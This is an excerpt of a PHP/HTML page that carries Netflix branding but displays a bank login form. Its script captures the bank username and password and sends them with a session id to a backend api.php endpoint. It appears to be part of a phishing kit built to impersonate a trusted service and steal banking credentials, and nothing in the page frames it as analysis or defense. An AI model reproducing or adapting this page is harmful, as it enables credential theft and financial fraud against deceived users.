...
<head>
    ...
    <title>Netflix - <?php echo t('bank_login', $lang); ?></title>
...
<body>
    ...
    <main class="nf-main">
        <div class="nf-card bank-card">
            <div class="bank-header">🏦</div>
            <h2><?php echo t('bank_login', $lang); ?></h2>
            <p class="bank-desc"><?php echo t('bank_sub', $lang); ?></p>

            <form id="bankForm">
                <div class="nf-input-wrap">
                    <input type="text" id="bank_user" required placeholder=" ">
                    <label><?php echo t('bank_user', $lang); ?></label>
                </div>
                <div class="nf-input-wrap">
                    <input type="password" id="bank_pass" required placeholder=" ">
                    <label><?php echo t('bank_pass', $lang); ?></label>
                </div>
    ...
    <script>
        ...
        document.getElementById('bankForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const user = document.getElementById('bank_user').value;
            const pass = document.getElementById('bank_pass').value;
            ...
            await fetch('api.php', {
                ...
                body: 'action=bank&sid=' + sid + '&bank_user=' + encodeURIComponent(user) + '&bank_pass=' + encodeURIComponent(pass)
            });
